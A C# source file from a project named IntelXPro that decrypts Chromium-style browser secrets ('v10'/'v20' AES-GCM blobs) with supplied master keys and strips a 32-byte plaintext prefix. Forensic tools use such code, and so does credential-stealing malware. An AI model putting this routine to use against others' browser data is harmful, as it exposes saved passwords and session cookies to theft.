using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Dependencies.Encryption
{
    public static class AesGcm
    {
        private const int MacBitSize = 128;

        private const int NonceBitSize = 96;

        private const int TagBytes = 16;

        private const int NonceBytes = 12;

        private const int HeaderBytes = 3;

        public static byte[] DecryptBrowser(byte[] encryptedData, byte[] masterKey10, byte[] masterKey20, bool checkprefix)
        {
            if (encryptedData.Length < 31)
            {
                return null;
            }
            string text = Encoding.ASCII.GetString(encryptedData, 0, 3);
            byte[] array = new byte[12];
            Buffer.BlockCopy(encryptedData, 3, array, 0, 12);
            int num = 15;
            int num2 = encryptedData.Length - num - 16;
            if (num2 < 0)
            {
                return null;
            }
            byte[] array2 = new byte[num2];
            if (num2 > 0)
            {
                Buffer.BlockCopy(encryptedData, num, array2, 0, num2);
            }
            byte[] array3 = new byte[16];
            Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, array3, 0, 16);
            byte[] array4 = ((text == "v20") ? masterKey20 : ((text == "v10") ? masterKey10 : null));
            if (array4 == null)
            {
                return null;
            }
            byte[] array5 = AesGcm256.Decrypt(array4, array, null, array2, array3);
            if (array5 == null)
            {
                return null;
            }
            if (checkprefix && HasPrefix(array5))
            {
                if (array5.Length <= 32)
                {
                    return array5;
                }
                int num3 = 0;
                for (int i = 0; i < 32; i++)
                {
                    byte b = array5[i];
                    if (b >= 32 && b <= 126)
                    {
                        num3++;
                    }
                    if (num3 > 2)
                    {
                        break;
                    }
                }
                if (num3 > 2)
                {
                    if (array5.Length <= 32)
                    {
                        return new byte[0];
                    }
                    byte[] array6 = new byte[array5.Length - 32];
                    Array.Copy(array5, 32, array6, 0, array6.Length);
                    return array6;
                }
            }
            return array5;
        }

        private static bool HasPrefix(byte[] plainText)
        {
            if (plainText.Length < 32)
            {
                return false;
            }
            int num = 0;
            for (int i = 0; i < 32; i++)
            {
                if (plainText[i] >= 32 && plainText[i] <= 126)
                {
                    num++;
                }
            }
            return num > 2;
        }
    }
}
